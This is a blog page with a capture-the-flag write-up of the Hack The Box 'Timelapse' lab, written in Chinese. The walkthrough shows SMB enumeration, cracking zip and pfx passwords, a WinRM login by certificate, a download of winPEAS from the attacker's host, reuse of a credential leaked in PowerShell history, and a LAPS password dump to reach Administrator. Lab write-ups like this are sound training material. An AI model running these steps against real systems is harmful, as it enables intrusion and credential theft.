<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>Timelapse - Hackthebox | Lucifiel&#39;s Blog | Lucifiel æŠ€æœ¯åšå®¢</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Hackthebox">
    <meta name="description" content="Hackthebox - Timelapseé¶åœºä¿¡æ¯  é¶åœºç±»å‹  ä¿¡æ¯æœé›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~&#x2F;Desktop&#x2F;HTB&#x2F;Easy&#x2F;Timelapse] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.152 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-03-29">
<meta property="og:type" content="article">
<meta property="og:title" content="Timelapse - Hackthebox">
<meta property="og:url" content="http://www.lucifiel.com/2022/04/01/Hackthebox/Easy/Hackthebox-Timelapse/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="Hackthebox - Timelapseé¶åœºä¿¡æ¯  é¶åœºç±»å‹  ä¿¡æ¯æœé›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~&#x2F;Desktop&#x2F;HTB&#x2F;Easy&#x2F;Timelapse] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.152 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-03-29">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2022/04/01/Hackthebox/Easy/Hackthebox-Timelapse/21d30a56-eb87-405e-a64a-7d06304b00b0.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/04/01/Hackthebox/Easy/Hackthebox-Timelapse/d71ce49e-2d3d-42f1-aa45-a4feaaff6b38.png">
<meta property="article:published_time" content="2022-04-01T11:38:36.000Z">
<meta property="article:modified_time" content="2023-06-13T03:54:00.000Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Hackthebox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2022/04/01/Hackthebox/Easy/Hackthebox-Timelapse/21d30a56-eb87-405e-a64a-7d06304b00b0.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                ä¸»é¡µ
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://www.buymeacoffee.com/lucifiel" target="_blank" >
                <i class="icon icon-lg icon-coffee"></i>
                è¯·æˆ‘å–å’–å•¡
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Timelapse - Hackthebox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="è¾“å…¥æ„Ÿå…´è¶£çš„å…³é”®å­—">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Timelapse - Hackthebox</h1>
        <h5 class="subtitle">
            
                <time datetime="2022-04-01T11:38:36.000Z" itemprop="datePublished" class="page-time">
  2022-04-01
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Timelapse"><span class="post-toc-text">Hackthebox - Timelapse</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#é¶åœºä¿¡æ¯"><span class="post-toc-text">é¶åœºä¿¡æ¯</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#é¶åœºç±»å‹"><span class="post-toc-text">é¶åœºç±»å‹</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ä¿¡æ¯æœé›†"><span class="post-toc-text">ä¿¡æ¯æœé›†</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Smb"><span class="post-toc-text">Smb</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#John"><span class="post-toc-text">John</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#æ¼æ´åˆ©ç”¨"><span class="post-toc-text">æ¼æ´åˆ©ç”¨</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#æƒé™æå‡"><span class="post-toc-text">æƒé™æå‡</span></a></li></ol>
        </nav>
    </aside>


<article id="post-Hackthebox/Easy/Hackthebox-Timelapse"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Timelapse - Hackthebox</h1>
        <div class="post-meta">
            <time class="post-time" title="2022-04-01 19:38:36" datetime="2022-04-01T11:38:36.000Z"  itemprop="datePublished">2022-04-01</time>

            


            
<span id="busuanzi_container_page_pv" title="æ–‡ç« æ€»é˜…è¯»é‡" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="Hackthebox-Timelapse"><a href="#Hackthebox-Timelapse" class="headerlink" title="Hackthebox - Timelapse"></a>Hackthebox - Timelapse</h1><h1 id="é¶åœºä¿¡æ¯"><a href="#é¶åœºä¿¡æ¯" class="headerlink" title="é¶åœºä¿¡æ¯"></a>é¶åœºä¿¡æ¯</h1><img src="/2022/04/01/Hackthebox/Easy/Hackthebox-Timelapse/21d30a56-eb87-405e-a64a-7d06304b00b0.png" class>

<h1 id="é¶åœºç±»å‹"><a href="#é¶åœºç±»å‹" class="headerlink" title="é¶åœºç±»å‹"></a>é¶åœºç±»å‹</h1><img src="/2022/04/01/Hackthebox/Easy/Hackthebox-Timelapse/d71ce49e-2d3d-42f1-aa45-a4feaaff6b38.png" class>

<h1 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]
â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.152
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-29 02:18 EDT
Nmap scan report for 10.10.11.152
Host is up (0.55s latency).
Not shown: 65525 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-29 14:19:01Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_ssl-date: 2022-03-29T14:21:28+00:00; +7h59m58s from scanner time.
| tls-alpn: 
|_  http/1.1
9389/tcp  open  mc-nmf        .NET Message Framing
49674/tcp open  msrpc         Microsoft Windows RPC
51354/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m57s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-03-29T14:20:18
|_  start_date: N/A

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   556.15 ms 10.10.16.1
2   556.22 ms 10.10.11.152

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 196.57 seconds
</code></pre>
<h2 id="Smb"><a href="#Smb" class="headerlink" title="Smb"></a>Smb</h2><p>è¿™å°æœºå™¨æ˜æ˜¾æœ‰ smbï¼Œå…ˆå»æ‰¾ä¸€ä¸‹ guest ç”¨æˆ·çš„ç¥¨æ®</p>
<pre><code class="bash">enum4linux -a -u &quot;guset&quot; -p &quot;&quot; 10.10.11.152

[+] Attempting to map shares on 10.10.11.152
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.11.152/ADMIN$   Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.11.152/C$       Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.11.152/IPC$     [E] Can&#39;t understand response:
NT_STATUS_INVALID_INFO_CLASS listing \*
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.11.152/NETLOGON Mapping: OK     Listing: DENIED
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.11.152/Shares   Mapping: OK, Listing: OK
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.11.152/SYSVOL   Mapping: OK     Listing: DENIED
</code></pre>
<p>è¯¥ Shares æ–‡ä»¶å¤¹å¯ä¾›é˜…è¯»ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹é‡Œé¢æœ‰äº›ä»€ä¹ˆ</p>
<pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]
â””â”€# smbclient -U &quot;guest&quot; //10.10.11.152/Shares 
Enter WORKGROUP\guest&#39;s password: 
Try &quot;help&quot; to get a list of possible commands.
smb: \&gt; dir
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021

                6367231 blocks of size 4096. 2323752 blocks available
</code></pre>
<p>æœ‰ä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼Œå»æŒ¨ä¸ªæŸ¥è¯¢ä¸€ä¸‹</p>
<pre><code class="bash">smb: \&gt; cd Dev
smb: \Dev\&gt; dir
  .                                   D        0  Mon Oct 25 15:40:06 2021
  ..                                  D        0  Mon Oct 25 15:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021

                6367231 blocks of size 4096. 2323752 blocks available
</code></pre>
<p>Dev ç›®å½•ä¸‹æœ‰ä¸€ä¸ª winrm_backup.zip å‹ç¼©æ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥çœ‹çœ‹</p>
<pre><code class="bash">smb: \Dev\&gt; get winrm_backup.zip 
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (1.3 KiloBytes/sec) (average 1.3 KiloBytes/sec)
</code></pre>
<h2 id="John"><a href="#John" class="headerlink" title="John"></a>John</h2><p>ä¸‹è½½ä¸‹æ¥äº†ï¼Œå»æŸ¥çœ‹ä¸€ä¸‹</p>
<pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]
â””â”€# unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password:
</code></pre>
<p>éœ€è¦è§£å‹å¯†ç ï¼Œå’±ä»¬æ²¡æœ‰å•Šï¼Œä½¿ç”¨ john å°è¯•çˆ†ç ´ä¸€ä¸‹</p>
<pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]
â””â”€# zip2john winrm_backup.zip &gt; hash
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: 2b chk, TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683

â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]
â””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt hash    
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
1g 0:00:00:00 DONE (2022-03-29 21:46) 3.333g/s 11578Kp/s 11578Kc/s 11578KC/s surfroxy154..supergay01
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed
</code></pre>
<p>è§£å‹å¯†ç æ˜¯ supremelegacy å»è§£å‹ä¸€ä¸‹</p>
<pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]
â””â”€# unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx
</code></pre>
<h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>è§£å‹å‡ºæ¥åæœ‰ä¸€ä¸ª pfx æ–‡ä»¶ï¼ŒæŸ¥è¯¢äº†ä¸€ä¸‹ pfx å¯ä»¥ä½¿ç”¨ openssl æå–å‡ºç§é’¥ï¼Œå»æå–ä¸€ä¸‹</p>
<blockquote>
<p><a href="https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file" target="_blank" rel="noopener">https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file</a></p>
</blockquote>
<pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]
â””â”€# openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out prv.key
Enter Import Password:
Mac verify error: invalid password?
</code></pre>
<p>æå–æ—¶å‘ç°ä¹Ÿéœ€è¦å¯†ç ï¼Œä½¿ç”¨åˆšæ‰ zip çˆ†ç ´å‡ºæ¥çš„å¯†ç å°è¯•å¤±è´¥ï¼Œå†å»çˆ†ç ´ä¸€ä¸‹</p>
<pre><code class="bash">    â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]
â””â”€# pfx2john legacyy_dev_auth.pfx &gt; hashbis 

â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]
â””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt hashbis 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:01:58 DONE (2022-03-29 21:53) 0.008414g/s 27189p/s 27189c/s 27189C/s thuglife06..thug211
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed.
</code></pre>
<p>çˆ†ç ´å‡ºæ¥å¯†ç  thuglegacyï¼Œç„¶åå†å»æå–ä¸€ä¸‹</p>
<pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]
â””â”€# openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -out prv.key          
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:

â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]
â””â”€# openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt
Enter Import Password:

â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]
â””â”€# ls
cert.crt  hash  hashbis  legacyy_dev_auth.pfx  nmap  prv.key  winrm_backup.zip
</code></pre>
<p>ä½¿ç”¨ evil-winrm è¿›è¡Œåˆ©ç”¨</p>
<pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]
â””â”€# evil-winrm -i 10.10.11.152 -S -c cert.crt -k prv.key -p -u

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

Enter PEM pass phrase:
*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; whoami
timelapse\legacyy
</code></pre>
<p>æˆåŠŸæ‹¿åˆ°ä¸€ä¸ª user æƒé™</p>
<pre><code class="bash">*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; type &#39;C:\Users\legacyy\Desktop\user.txt&#39;
622218eb92f1c85ad186d6aee0dbdb53
</code></pre>
<p>æˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶</p>
<h1 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h1><p>åœ¨æœ¬åœ°å¼€å¯ä¸€ä¸ª HTTP æœåŠ¡</p>
<pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# python3 -m http.server 80                                    
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
</code></pre>
<p>ä½¿ç”¨ powershell ä¸‹è½½æˆ‘ä»¬æœ¬åœ°çš„ winPEAS.exe è¾…åŠ©ææƒè„šæœ¬</p>
<pre><code class="bash">powershell &quot;Invoke-WebRequest -UseBasicParsing 10.10.16.4/winPEASx64.exe -OutFile winPEASx64.exe&quot;
</code></pre>
<p>ç„¶åè¿è¡Œ</p>
<pre><code class="bash">*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; powershell &quot;Invoke-WebRequest -UseBasicParsing 10.10.16.4/winPEASx64.exe -OutFile winPEASx64.exe&quot;
*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; ./winPEASx64.exe
</code></pre>
<pre><code class="bash">Ã‰ÃÃÃÃÃÃÃÃÃÃÂ¹ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 434B
</code></pre>
<p>å‘ç°äº†ä¸€ä¸ªåŒ…å«å†å²å‘½ä»¤è®°å½•çš„æ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥</p>
<pre><code class="bash">download C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
</code></pre>
<p>ç„¶åæŸ¥çœ‹ä¸€ä¸‹</p>
<pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]
â””â”€# cat ConsoleHost_history.txt                                                                         
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString &#39;E3R$Q62^12p7PLlC%KWaxuaV&#39; -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential (&#39;svc_deploy&#39;, $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
</code></pre>
<p>å°è¯•ä½¿ç”¨ laps.py æ¥è¿›è¡Œæ“ä½œ</p>
<blockquote>
<p><a href="https://github.com/n00py/LAPSDumper/blob/main/laps.py" target="_blank" rel="noopener">https://github.com/n00py/LAPSDumper/blob/main/laps.py</a></p>
</blockquote>
<p>é¦–å…ˆå°†æ·»åŠ ä¸€ä¸ªæœ¬åœ° DNS è§£æ</p>
<pre><code class="bash">echo 10.10.11.152 timelapse.htb &gt;&gt; /etc/hosts
</code></pre>
<p>ç„¶åæ‰§è¡Œ</p>
<pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]
â””â”€# python3 laps.py -u svc_deploy -p &#39;E3R$Q62^12p7PLlC%KWaxuaV&#39; -d timelapse.htb
DC01$:C9(3OIh923TK13J.iADjN))A
</code></pre>
<p>æ‹¿åˆ°äº†ä¸€ä¸ªå¯†ç </p>
<p>ç»§ç»­ä½¿ç”¨ evil-winrm ç™»å½•</p>
<pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]
â””â”€# evil-winrm -i 10.10.11.152 -S -u Administrator -p &#39;C9(3OIh923TK13J.iADjN))A&#39; 

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
timelapse\administrator
</code></pre>
<p>æˆåŠŸæ‹¿åˆ°ä¸€ä¸ª administrator æƒé™</p>
<pre><code class="bash">*Evil-WinRM* PS C:\users\TRX\Desktop&gt; cat root.txt
365b8463a586a128c09558558d4deceb
</code></pre>
<p>æˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶</p>

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/04/01/Hackthebox/Easy/Hackthebox-Timelapse/&title=ã€ŠTimelapse - Hacktheboxã€‹ â€” Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="å¾®åš">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="å¾®ä¿¡">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/04/01/Hackthebox/Easy/Hackthebox-Timelapse/&title=ã€ŠTimelapse - Hacktheboxã€‹ â€” Lucifiel's Blog&source=Lucifiel æŠ€æœ¯åšå®¢" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/04/01/Hackthebox/Easy/Hackthebox-Timelapse/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=ã€ŠTimelapse - Hacktheboxã€‹ â€” Lucifiel's Blog&url=http://www.lucifiel.com/2022/04/01/Hackthebox/Easy/Hackthebox-Timelapse/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/04/01/Hackthebox/Easy/Hackthebox-Timelapse/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2022/04/02/Hackthebox/Easy/Hackthebox-Mirai/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Mirai - Hackthebox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2022/03/31/Hackthebox/Easy/Hackthebox-Blocky/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Blocky - Hackthebox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'cf0a9809323df14a9168',
          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
          repo: 'LucifielHack.github.io',
          owner: 'LucifielHack',
          admin: ['LucifielHack'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        ç«™ç‚¹æ€»è®¿å®¢æ•°ï¼š<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        ç«™ç‚¹æ€»è®¿é—®é‡ï¼š<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            <!--- 
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>footer.license</span> --->
        </p>
    </div>
    <div class="bottom">
        <p><span>Lucifiel &copy; 2020 - 2024</span>
            <span>
                
                Power by Lucifiel</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
